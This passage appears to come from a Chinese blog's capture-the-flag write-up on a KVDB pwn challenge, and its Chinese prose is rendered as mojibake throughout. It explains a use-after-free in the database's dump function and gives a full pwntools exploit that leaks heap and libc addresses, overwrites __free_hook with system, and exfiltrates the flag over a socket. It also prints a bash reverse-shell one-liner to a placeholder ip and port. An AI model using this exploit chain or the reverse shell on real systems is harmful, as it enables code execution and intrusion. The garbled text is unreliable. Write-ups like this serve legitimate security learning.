class="line">                tmp-&gt;<span class="built_in">array</span>.items[i] = item;</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">return</span> tmp;</span><br><span class="line">        <span class="keyword">case</span> DATA_TYPE_EMPTY:</span><br><span class="line"><span class="meta">#<span class="meta-keyword">ifdef</span> DEBUG</span></span><br><span class="line">            <span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">&quot;[%d] &quot;</span>, getpid());</span><br><span class="line">            <span class="keyword">for</span> (<span class="keyword">int</span> l = <span class="number">0</span>; l &lt; level; l++) &#123;</span><br><span class="line">                <span class="built_in">printf</span>(<span class="string">&quot;- &quot;</span>);</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">&quot;Empty data_t\n&quot;</span>);</span><br><span class="line"><span class="meta">#<span class="meta-keyword">endif</span></span></span><br><span class="line">            tmp-&gt;type = DATA_TYPE_EMPTY;</span><br><span class="line">            <span class="keyword">return</span> tmp;</span><br><span class="line">        <span class="keyword">default</span>:</span><br><span class="line">            <span class="keyword">goto</span> INVALID;</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">    &#125;</span><br><span class="line">INVALID:</span><br><span class="line">    <span class="built_in">free</span>(tmp);</span><br><span class="line">    <span class="keyword">return</span> <span class="literal">NULL</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h3 id="0x3-æ¼æ´"><a href="#0x3-æ¼æ´" class="headerlink" title="0x3 æ¼æ´"></a>0x3 æ¼æ´</h3><p>æ¼æ´å°±æ˜¯å‡ºåœ¨dumpå‡½æ•°ä¸­çš„<code>dump_data_item()</code>èº«ä¸Šï¼Œä»–å¯¹æ•°æ®åº“çš„å¤åˆ¶å¹¶ä¸æ˜¯æ·±æ‹·è´ï¼Œè€Œæ˜¯ç›´æ¥æŠŠåœ°å€æ‹¿è¿‡æ¥äº†ï¼Œæœ€åè¿˜æŠŠè¿™äº›åœ°å€å…¨éƒ½é€šè¿‡<code>release_data_t()</code>å‡½æ•°é‡Šæ”¾äº†ï¼Œä½†æ˜¯è¿™äº›åœ°å€è¿˜å­˜åœ¨åœ¨æ•°æ®åº“ä¸­ï¼Œæ‰€ä»¥å¯¼è‡´äº†<code>uaf</code>ã€‚</p>
<figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">data_t</span> *<span class="title">dump_data_item</span><span class="params">()</span></span>&#123;</span><br><span class="line">    <span class="keyword">data_t</span> *dump_array = (<span class="keyword">data_t</span> *)<span class="built_in">calloc</span>(<span class="number">1</span>, <span class="built_in"><span class="keyword">sizeof</span></span>(<span class="keyword">data_t</span>));</span><br><span class="line">    <span class="keyword">if</span>(!dump_array) <span class="keyword">return</span> <span class="literal">NULL</span>;</span><br><span class="line">    dump_array-&gt;type = DATA_TYPE_ARRAY;</span><br><span class="line">    dump_array-&gt;array.count = database.<span class="built_in">size</span>();</span><br><span class="line">    dump_array-&gt;array.items = (<span class="keyword">data_t</span> **)<span class="built_in">calloc</span>(dump_array-&gt;array.count, <span class="built_in"><span class="keyword">sizeof</span></span>(<span class="keyword">data_t</span> *));</span><br><span class="line">    std::list&lt;kvpair&gt;::iterator iter;</span><br><span class="line">    <span class="keyword">int</span> i;</span><br><span class="line">    <span class="keyword">for</span> (iter = database.<span class="built_in">begin</span>(), i = <span class="number">0</span>; iter != database.<span class="built_in">end</span>(); iter++, i++) &#123;</span><br><span class="line">        <span class="comment">/* item_array[2] = &#123;key, value&#125; */</span></span><br><span class="line">        <span class="keyword">data_t</span> *item_array = (<span class="keyword">data_t</span> *)<span class="built_in">calloc</span>(<span class="number">1</span>, <span class="built_in"><span class="keyword">sizeof</span></span>(<span class="keyword">data_t</span>));</span><br><span class="line">        item_array-&gt;type = DATA_TYPE_ARRAY;</span><br><span class="line">        item_array-&gt;array.count = <span class="number">2</span>;</span><br><span class="line">        item_array-&gt;array.items = (<span class="keyword">data_t</span> **)<span class="built_in">calloc</span>(<span class="number">2</span>, <span class="built_in"><span class="keyword">sizeof</span></span>(<span class="keyword">data_t</span> *));</span><br><span class="line">        item_array-&gt;array.items[<span class="number">0</span>] = iter-&gt;first.<span class="built_in">get_data_t</span>();</span><br><span class="line">        item_array-&gt;array.items[<span class="number">1</span>] = iter-&gt;second.<span class="built_in">get_data_t</span>();</span><br><span class="line">        dump_array-&gt;array.items[i] = item_array;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> dump_array;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h3 id="0x4-æ¼æ´åˆ©ç”¨"><a href="#0x4-æ¼æ´åˆ©ç”¨" class="headerlink" title="0x4 æ¼æ´åˆ©ç”¨"></a>0x4 æ¼æ´åˆ©ç”¨</h3><p>è¿™ä¸ªç¨‹åºè§‰å¾—æœ€éš¾çš„ä¸æ˜¯å‘ç°æ¼æ´ï¼Œè€Œæ˜¯å‘ç°æ¼æ´åè¯¥å¦‚ä½•åˆ©ç”¨æ¼æ´ï¼ŒæˆåŠŸå‘ç°æ¼æ´åˆ°åˆ©ç”¨æˆåŠŸåˆèŠ±äº†ä¸€å¤©ï¼Œç”±äºkeyå’Œvalueçš„å‰å…«ä¸ªå­—èŠ‚æ”¾çš„æ˜¯ä»–çš„ç±»å‹ï¼Œå¦‚æœè¢«freeçš„è¯å°±ä¼šç ´åï¼Œä½†æ˜¯å¦‚æœå†æ¬¡è®¿é—®çš„è¯å°±è®¿é—®ä¸åˆ°äº†ï¼Œåˆšå¼€å§‹çš„æ€è·¯æ˜¯è®©freeæ‰çš„å †è¢«unlinkå°±å¥½äº†ï¼Œä½†æ˜¯è¯•äº†ä¸€ä¼šå‘ç°0x20å¤§å°çš„å †æ ¹æœ¬ä¸ä¼šunlink,æ‰€ä»¥æ²¡åŠæ³•freeå®Œä¹‹åç«‹å³ä½¿ç”¨</p>
<p>æ­£ç¡®çš„æ€è·¯å°±æ˜¯ç›´æ¥å†ç”³è¯·è¢«freeæ‰çš„å †å—ï¼Œè¿™æ ·å°±æœ‰ä¸¤ä¸ªæŒ‡é’ˆæŒ‡å‘åŒä¸€å—åŒºåŸŸäº†ï¼Œç„¶ååœ¨ç”³è¯·çš„æ—¶å€™ç”³è¯·stringçš„value,å°±å¯ä»¥åˆ©ç”¨stringæ§åˆ¶èŠ‚ç‚¹äº†ã€‚è¿™æ˜¯ä¸ªæ¦‚ç‡äº‹ä»¶ï¼Œå¾—å¤šæ¬¡é‡å¤çš„ç”³è¯·æ‰å¯èƒ½æˆåŠŸã€‚</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#add_int_string</span></span><br><span class="line">payload=add_int_string(<span class="number">0x10</span>,<span class="number">0x40</span>,<span class="string">&#x27;a&#x27;</span>)</span><br><span class="line">payload+=add_int_string(<span class="number">0x20</span>,<span class="number">0x40</span>,<span class="string">&#x27;b&#x27;</span>)</span><br><span class="line">payload+=add_int_string(<span class="number">0x30</span>,<span class="number">0x40</span>,<span class="string">&#x27;c&#x27;</span>)</span><br><span class="line">payload+=add_int_string(<span class="number">0x40</span>,<span class="number">0x40</span>,<span class="string">&#x27;d&#x27;</span>)</span><br><span class="line">payload+=add_int_string(<span class="number">0x50</span>,<span class="number">0x40</span>,<span class="string">&#x27;e&#x27;</span>)</span><br><span class="line">payload+=add_int_string(<span class="number">0x60</span>,<span class="number">0x40</span>,<span class="string">&#x27;f&#x27;</span>)</span><br><span class="line"><span class="comment">#dump</span></span><br><span class="line">payload+=dump()</span><br><span class="line"><span class="comment">#add_string_string</span></span><br><span class="line">payload+=add_int_string(<span class="number">0x70</span>,<span class="number">0x16</span>,<span class="string">&#x27;\x00&#x27;</span>)</span><br><span class="line">payload+=add_int_string(<span class="number">0x80</span>,<span class="number">0x16</span>,<span class="string">&#x27;b&#x27;</span>*<span class="number">0x16</span>)</span><br><span class="line">payload+=add_int_string(<span class="number">0x90</span>,<span class="number">0x16</span>,<span class="string">&#x27;c&#x27;</span>*<span class="number">0x16</span>)</span><br><span class="line">payload+=add_int_string(<span class="number">0xa0</span>,<span class="number">0x16</span>,<span class="string">&#x27;d&#x27;</span>*<span class="number">0x16</span>)</span><br><span class="line">payload+=add_int_string(<span class="number">0xb0</span>,<span class="number">0x16</span>,<span class="string">&#x27;e&#x27;</span>*<span class="number">0x16</span>)</span><br><span class="line">payload+=add_int_string(<span class="number">0xc0</span>,<span class="number">0x16</span>,<span class="string">&#x27;f&#x27;</span>*<span class="number">0x16</span>)</span><br></pre></td></tr></table></figure>

<p>è¿™æ ·ä»¥åå †å—çš„å †å æƒ…å†µæ˜¯è¿™æ ·çš„</p>
<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#</span><span class="bash">è¿™æ˜¯æ¯ä¸€ä¸ªé”®å€¼å¯¹çš„å †å—çš„å12ä½</span></span><br><span class="line">1:0a0 0c0</span><br><span class="line">2:310 330</span><br><span class="line">3:4c0 4e0</span><br><span class="line">4:5d0 5f0</span><br><span class="line">5:690 6b0</span><br><span class="line">6:750 770</span><br><span class="line"><span class="meta">#</span><span class="bash">å†ç”³è¯·å</span></span><br><span class="line">0x70 string-&gt;0x80 value</span><br><span class="line">0xa0 string-&gt;310</span><br><span class="line">0xb0 string-&gt;0c0</span><br><span class="line">0xc0 value -&gt;0c0</span><br></pre></td></tr></table></figure>

<p>å¯è§æˆ‘ä»¬å¯ä»¥æ§åˆ¶3ä¸ªèŠ‚ç‚¹äº†ï¼Œåˆ©ç”¨è¿™ä¸‰ä¸ªèŠ‚ç‚¹å®Œæˆå¯¹<code>__free_hook</code>çš„æ”¹å†™ï¼Œç„¶ååå¼¹flagï¼Œå‡ºé¢˜äººè¯´ä¸è¿å¤–ç½‘ï¼Œæ‰€ä»¥ç›´æ¥é€šè¿‡sokcetæŠŠflagåå¼¹å›æ¥</p>
<p>å®Œæ•´è„šæœ¬</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">ip=<span class="string">&quot;127.0.0.1&quot;</span></span><br><span class="line">port=<span class="number">9998</span></span><br><span class="line">context.log_level=<span class="string">&#x27;debug&#x27;</span></span><br><span class="line"><span class="comment">#sh=remote(ip,port)</span></span><br><span class="line">sh=remote(<span class="string">&quot;pwn.archive.xdsec.chall.frankli.site&quot;</span>,<span class="number">10088</span>)</span><br><span class="line">libc=ELF(<span class="string">&quot;/lib/x86_64-linux-gnu/libc.so.6&quot;</span>)</span><br><span class="line">op_buf=&#123;</span><br><span class="line">    <span class="number">1</span>:<span class="string">b&quot;ADD&quot;</span>,</span><br><span class="line">    <span class="number">2</span>:<span class="string">b&quot;DEL&quot;</span>,</span><br><span class="line">    <span class="number">3</span>:<span class="string">b&quot;MDF&quot;</span>,</span><br><span class="line">    <span class="number">4</span>:<span class="string">b&quot;RNM&quot;</span>,</span><br><span class="line">    <span class="number">5</span>:<span class="string">b&quot;CPY&quot;</span>,</span><br><span class="line">    <span class="number">6</span>:<span class="string">b&quot;GET&quot;</span>,</span><br><span class="line">    <span class="number">7</span>:<span class="string">b&quot;DUM&quot;</span>,</span><br><span class="line">    <span class="number">8</span>:<span class="string">b&quot;CLR&quot;</span>,</span><br><span class="line">    <span class="number">9</span>:<span class="string">b&quot;SHUT&quot;</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">build_int</span>(<span class="params">digit</span>):</span></span><br><span class="line">    pay=p16(<span class="number">0x0100</span>)+p64(digit)</span><br><span class="line">    <span class="keyword">return</span> pay</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">build_string</span>(<span class="params">str_len,str_srt</span>):</span></span><br><span class="line">    strlen=((str_len&amp;<span class="number">0xff000000</span>)&gt;&gt;<span class="number">24</span>)|((str_len&amp;<span class="number">0x00ff0000</span>)&gt;&gt;<span class="number">8</span>)|((str_len&amp;<span class="number">0x0000ff00</span>)&lt;&lt;<span class="number">8</span>)|((str_len&amp;<span class="number">0x000000ff</span>)&lt;&lt;<span class="number">24</span>)</span><br><span class="line">    pay=p16(<span class="number">0x0300</span>)+p32(strlen)</span><br><span class="line">    pay+=<span class="built_in">bytes</span>(str_srt.ljust(str_len,<span class="string">&#x27;\x00&#x27;</span>),<span class="string">&#x27;utf-8&#x27;</span>)</span><br><span class="line">    <span class="keyword">return</span> pay</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">build_string1</span>(<span class="params">str_len,str_srt</span>):</span></span><br><span class="line">    strlen=((str_len&amp;<span class="number">0xff000000</span>)&gt;&gt;<span class="number">24</span>)|((str_len&amp;<span class="number">0x00ff0000</span>)&gt;&gt;<span class="number">8</span>)|((str_len&amp;<span class="number">0x0000ff00</span>)&lt;&lt;<span class="number">8</span>)|((str_len&amp;<span class="number">0x000000ff</span>)&lt;&lt;<span class="number">24</span>)</span><br><span class="line">    pay=p16(<span class="number">0x0300</span>)+p32(strlen)</span><br><span class="line">    pay+=str_srt</span><br><span class="line">    <span class="keyword">return</span> pay</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">msg</span>(<span class="params">code,context</span>):</span></span><br><span class="line">    pay=<span class="string">b&#x27;KVDB&#x27;</span>+p16(<span class="number">0x0300</span>)+op_buf[code]</span><br><span class="line">    <span class="keyword">if</span>(context!=<span class="string">b&#x27;&#x27;</span>):</span><br><span class="line">        pay+=context</span><br><span class="line">    <span class="keyword">return</span> pay</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">add_int_string</span>(<span class="params">key_value,value_len,content</span>):</span></span><br><span class="line">    pay=build_int(key_value)</span><br><span class="line">    pay+=build_string(value_len,content)</span><br><span class="line">    <span class="keyword">return</span> msg(<span class="number">1</span>,pay)</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">dump</span>():</span></span><br><span class="line">    <span class="keyword">return</span> msg(<span class="number">7</span>,<span class="string">b&#x27;&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">clear</span>():</span></span><br><span class="line">    <span class="keyword">return</span> msg(<span class="number">8</span>,<span class="string">b&#x27;&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">add_string_string</span>(<span class="params">key_len,key_content,value_len,value_content</span>):</span></span><br><span class="line">    pay=build_string(key_len,key_content)</span><br><span class="line">    pay+=build_string(value_len,value_content)</span><br><span class="line">    <span class="keyword">return</span> msg(<span class="number">1</span>,pay)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">del_string_key</span>(<span class="params">key_len,key_content</span>):</span></span><br><span class="line">    pay=build_string(key_len,key_content)</span><br><span class="line">    <span class="keyword">return</span> msg(<span class="number">2</span>,pay)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">stringkey_get_value</span>(<span class="params">key_len,key_value</span>):</span></span><br><span class="line">    pay=build_string(key_len,key_value)</span><br><span class="line">    <span class="keyword">return</span> msg(<span class="number">6</span>,pay)</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">intkey_get_value</span>(<span class="params">key_value</span>):</span></span><br><span class="line">    pay=build_int(key_value)</span><br><span class="line">    <span class="keyword">return</span> msg(<span class="number">6</span>,pay)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">del_int_key</span>(<span class="params">key_value</span>):</span></span><br><span class="line">    pay=build_int(key_value)</span><br><span class="line">    <span class="keyword">return</span> msg(<span class="number">2</span>,pay)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">change_value</span>(<span class="params">key_value,value_len,value_content</span>):</span></span><br><span class="line">    pay=build_int(key_value)</span><br><span class="line">    pay+=build_string1(value_len,value_content)</span><br><span class="line">    <span class="keyword">return</span> msg(<span class="number">3</span>,pay)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">change_key</span>(<span class="params">key_len,key_content,new_len,new_content</span>):</span></span><br><span class="line">    pay=build_string1(key_len,key_content)</span><br><span class="line">    pay+=build_string1(new_len,new_content)</span><br><span class="line">    <span class="keyword">return</span> msg(<span class="number">4</span>,pay)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">exp</span>():</span></span><br><span class="line">    <span class="comment">#add_int_string</span></span><br><span class="line">    payload=add_int_string(<span class="number">0x10</span>,<span class="number">0x40</span>,<span class="string">&#x27;a&#x27;</span>)</span><br><span class="line">    payload+=add_int_string(<span class="number">0x20</span>,<span class="number">0x40</span>,<span class="string">&#x27;b&#x27;</span>)</span><br><span class="line">    payload+=add_int_string(<span class="number">0x30</span>,<span class="number">0x40</span>,<span class="string">&#x27;c&#x27;</span>)</span><br><span class="line">    payload+=add_int_string(<span class="number">0x40</span>,<span class="number">0x40</span>,<span class="string">&#x27;d&#x27;</span>)</span><br><span class="line">    payload+=add_int_string(<span class="number">0x50</span>,<span class="number">0x40</span>,<span class="string">&#x27;e&#x27;</span>)</span><br><span class="line">    payload+=add_int_string(<span class="number">0x60</span>,<span class="number">0x40</span>,<span class="string">&#x27;f&#x27;</span>)</span><br><span class="line">    <span class="comment">#dump</span></span><br><span class="line">    payload+=dump()</span><br><span class="line">    <span class="comment">#add_string_string</span></span><br><span class="line">    payload+=add_int_string(<span class="number">0x70</span>,<span class="number">0x16</span>,<span class="string">&#x27;\x00&#x27;</span>)</span><br><span class="line">    payload+=add_int_string(<span class="number">0x80</span>,<span class="number">0x16</span>,<span class="string">&#x27;b&#x27;</span>*<span class="number">0x16</span>)</span><br><span class="line">    payload+=add_int_string(<span class="number">0x90</span>,<span class="number">0x16</span>,<span class="string">&#x27;c&#x27;</span>*<span class="number">0x16</span>)</span><br><span class="line">    payload+=add_int_string(<span class="number">0xa0</span>,<span class="number">0x16</span>,<span class="string">&#x27;d&#x27;</span>*<span class="number">0x16</span>)</span><br><span class="line">    payload+=add_int_string(<span class="number">0xb0</span>,<span class="number">0x16</span>,<span class="string">&#x27;e&#x27;</span>*<span class="number">0x16</span>)</span><br><span class="line">    payload+=add_int_string(<span class="number">0xc0</span>,<span class="number">0x16</span>,<span class="string">&#x27;f&#x27;</span>*<span class="number">0x16</span>)</span><br><span class="line">    <span class="comment">#del</span></span><br><span class="line">    payload+=del_int_key(<span class="number">0x80</span>)</span><br><span class="line">    <span class="comment">#get</span></span><br><span class="line">    payload+=intkey_get_value(<span class="number">0x70</span>)</span><br><span class="line">    sh.send(payload)</span><br><span class="line">    sleep(<span class="number">1</span>)</span><br><span class="line">    sh.recv(<span class="number">710</span>)</span><br><span class="line">    heap_base=u64(sh.recvuntil(<span class="string">&#x27;V&#x27;</span>)[-<span class="number">6</span>:]+<span class="string">b&#x27;\x00\x00&#x27;</span>)-<span class="number">0x128e0</span></span><br><span class="line">    <span class="built_in">print</span>(<span class="built_in">hex</span>(heap_base))</span><br><span class="line">    <span class="comment">#add</span></span><br><span class="line">    payload=add_int_string(<span class="number">0xd0</span>,<span class="number">0x500</span>,<span class="string">&#x27;g&#x27;</span>)</span><br><span class="line">    <span class="comment">#change_value</span></span><br><span class="line">    heap_addr=heap_base+<span class="number">0x12a60</span></span><br><span class="line">    payload+=change_value(<span class="number">0xb0</span>,<span class="number">0x16</span>,p64(<span class="number">3</span>)+p64(<span class="number">0x16</span>)+p32(heap_addr&amp;<span class="number">0xffffffff</span>)+p16((heap_addr&amp;<span class="number">0xffff00000000</span>)&gt;&gt;<span class="number">8</span>*<span class="number">4</span>))</span><br><span class="line">    <span class="comment">#get</span></span><br><span class="line">    payload+=intkey_get_value(<span class="number">0xc0</span>)</span><br><span class="line">    sh.send(payload)</span><br><span class="line"></span><br><span class="line">    libc_base=u64(sh.recvuntil(<span class="string">&#x27;\x7f&#x27;</span>)[-<span class="number">6</span>:]+<span class="string">b&#x27;\x00\x00&#x27;</span>)-<span class="number">0x1ecbe0</span></span><br><span class="line">    <span class="built_in">print</span>(<span class="built_in">hex</span>(libc_base))</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    system_addr=libc_base+libc.sym[<span class="string">&quot;system&quot;</span>]</span><br><span class="line">    free_hook=libc_base+libc.sym[<span class="string">&quot;__free_hook&quot;</span>]-<span class="number">0x20</span></span><br><span class="line">    pay1=<span class="string">b&#x27;cat flag &gt;&amp;4\x00&#x27;</span>+<span class="string">b&#x27;a&#x27;</span>*(<span class="number">0x20</span>-<span class="number">13</span>)+<span class="string">b&#x27;\x00&#x27;</span>*<span class="number">0x10</span></span><br><span class="line">    payload=change_value(<span class="number">0xb0</span>,<span class="number">0x16</span>,p64(<span class="number">3</span>)+p64(<span class="number">0x30</span>)+p32(free_hook&amp;<span class="number">0xffffffff</span>)+p16((free_hook&amp;<span class="number">0xffff00000000</span>)&gt;&gt;<span class="number">8</span>*<span class="number">4</span>))</span><br><span class="line">    payload+=change_value(<span class="number">0xc0</span>,<span class="number">0x30</span>,pay1)</span><br><span class="line">    payload+=change_value(<span class="number">0xa0</span>,<span class="number">0x16</span>,p64(<span class="number">3</span>)+p64(<span class="number">0x30</span>)+p32(free_hook&amp;<span class="number">0xffffffff</span>)+p16((free_hook&amp;<span class="number">0xffff00000000</span>)&gt;&gt;<span class="number">8</span>*<span class="number">4</span>))</span><br><span class="line">    pay=<span class="string">b&#x27;cat flag &gt;&amp;4\x00&#x27;</span>+<span class="string">b&#x27;a&#x27;</span>*(<span class="number">0x20</span>-<span class="number">13</span>)+p64(system_addr)+p64(<span class="number">0</span>)</span><br><span class="line">    payload+=change_key(<span class="number">0x30</span>,pay1,<span class="number">0x30</span>,pay)</span><br><span class="line">    sh.send(payload)</span><br><span class="line"></span><br><span class="line">    sh.interactive()</span><br><span class="line">exp()</span><br></pre></td></tr></table></figure>

<p>åå¼¹åŸç†</p>
<p>ç±»ä¼¼bashçš„åå¼¹åŸç†ï¼Œbashçš„åå¼¹å‘½ä»¤æ˜¯</p>
<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">base -i &amp;&gt; /dev/tcp/ip/port  0&gt;&amp;1</span><br></pre></td></tr></table></figure>

<p>å…¶ä¸­<code>base i</code>çš„ä½œç”¨æ˜¯äº§ç”Ÿä¸€ä¸ªbaseäº¤äº’ç¯å¢ƒï¼Œç„¶å<code>&amp;&gt;</code>ä»£è¡¨ç€æŠŠå‰é¢baseçš„äº¤äº’ç¯å¢ƒçš„æ ‡å‡†è¾“å‡ºå’Œæ ‡å‡†é”™è¯¯é‡å®šä½åˆ°åé¢çš„æ–‡ä»¶ä¸­ï¼Œç„¶ååé¢<code>0&gt;&amp;1</code>å°±æ˜¯æŠŠæ ‡å‡†è¾“å…¥é‡å®šä½åˆ°æ ‡å‡†è¾“å‡ºä¸Šï¼Œç”±äºæ ‡å‡†è¾“å‡ºæŒ‡å‘tcpè¿æ¥ï¼Œæ‰€ä»¥æ ‡å‡†è¾“å…¥ä¹Ÿé‡å®šä½åˆ°è¿™ä¸ªæ–‡ä»¶ä¸Šäº†ï¼Œè¿™æ ·å°±äº§ç”Ÿä¸€ä¸ªäº¤äº’å¼çš„baseäº†ã€‚</p>
<p>å…¶ä¸­æ¯”è¾ƒé‡è¦çš„å°±æ˜¯<code>&gt;&amp;</code>ç¬¦å·ï¼Œä»–ä¼šæŠŠå‰é¢çš„å†…å®¹é‡å®šå‘åˆ°åé¢çš„å†…å®¹ï¼Œåé¢æ˜¯ä¸ªfd,æ¯”å¦‚<code>echo flag &gt;&amp;1</code>å°±æ˜¯æŠŠflagé‡å®šå‘åˆ°äº†åˆ°äº†1å³æ ‡å‡†è¾“å‡ºï¼Œåœ¨è„šæœ¬ä¸­æˆ‘æ˜¯<code>cat flag &gt;&amp;4</code>å°±æ˜¯æŠŠflagæ–‡ä»¶çš„å†…å®¹é‡å®šå‘åˆ°äº†4å³scocketè¿æ¥ä¸Šã€‚æ‰€ä»¥ä¼šæŠŠflagå‘è¿‡æ¥ã€‚</p>

      
    </div>

    
    
    
      <footer class="post-footer">
        <div class="post-eof"></div>
      </footer>
  </article>
  
  
  

      
  
  
  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="zh-CN">
    <link itemprop="mainEntityOfPage" href="http://example.com/2022/04/27/TSCTF/">

    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
      <meta itemprop="image" content="/images/avatar.gif">
      <meta itemprop="name" content="rootzhang">
      <meta itemprop="description" content="æˆ‘çš„åšå®¢">
    </span>

    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
      <meta itemprop="name" content="study">
    </span>
      <header class="post-header">
        <h2 class="post-title" itemprop="name headline">
          
            <a href="/2022/04/27/TSCTF/" class="post-title-link" itemprop="url">TSCTF</a>
        </h2>

        <div class="post-meta">
            <span class="post-meta-item">
              <span class="post-meta-item-icon">
                <i class="far fa-calendar"></i>
              </span>
              <span class="post-meta-item-text">å‘è¡¨äº</span>
              

              <time title="åˆ›å»ºæ—¶é—´ï¼š2022-04-27 21:13:33 / ä¿®æ”¹æ—¶é—´ï¼š21:14:13" itemprop="dateCreated datePublished" datetime="2022-04-27T21:13:33+08:00">2022-04-27</time>
            </span>

          

        </div>
      </header>

    
    
    
    <div class="post-body" itemprop="articleBody">

      
